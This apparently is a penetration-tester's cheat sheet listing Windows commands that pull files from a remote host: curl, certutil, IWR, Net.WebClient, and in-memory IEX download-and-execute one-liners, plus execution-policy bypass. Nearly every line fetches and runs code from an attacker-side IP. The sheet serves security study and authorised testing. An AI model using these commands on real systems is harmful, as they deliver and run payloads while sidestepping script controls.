# Windows

## Temporary File Locations

* `%systemdrive%\Windows\Temp`: System-wide temp directory (e.g., `C:\Windows\Temp\file.txt`).
* `%userprofile%\AppData\Local\Temp`: User-specific temp directory (e.g., `C:\Users\user\AppData\Local\Temp\file.txt`).

## Curl

```
curl http://192.168.45.246/wget.exe -o wget.exe
```

## Certutil

Download a file from a URL.

```powershell
certutil -urlcache -split -f http://<target_ip>:<port>/<file> <local_path>\<file>
```

* Example: `certutil -urlcache -split -f http://192.168.1.200:80/script.exe C:\Windows\Temp\script.exe`

## IEX (Invoke-Expression)

Execute a remote script in memory without saving to disk.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<target_ip>:<port>/<file>')
```

* Example: `IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.200:80/script.ps1')`

Execute a remote script via pipeline.

```powershell
Invoke-WebRequest http://<target_ip>:<port>/<file> | iex
```

* Example: `powershell Invoke-WebRequest http://192.168.1.200:80/script.ps1 | iex`

## IWR (Invoke-WebRequest)

Download a file from a URL.

```powershell
IWR -Uri "http://<target_ip>:<port>/<file>" -OutFile "<local_path>\<file>"
```

* Example: `IWR -Uri "http://192.168.1.200:80/script.exe" -OutFile "C:\Windows\Temp\script.exe"`

## System.Net.WebClient

Download a file from a URL.

{% code overflow="wrap" %}

```powershell
(New-Object Net.WebClient).DownloadFile('http://<target_ip>:<port>/<file>', '<local_path>\<file>')
```

{% endcode %}

* Example: `(New-Object Net.WebClient).DownloadFile('http://192.168.1.200:80/script.exe', 'C:\Windows\Temp\script.exe')`

## Execute the Script

Set execution policy to allow running scripts.

```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

Run a PowerShell script, bypassing execution policy.

```powershell
powershell -ExecutionPolicy Bypass -File "<local_path>\<script>"
```

* Example: `powershell -ExecutionPolicy Bypass -File "C:\Windows\Temp\script.ps1"`
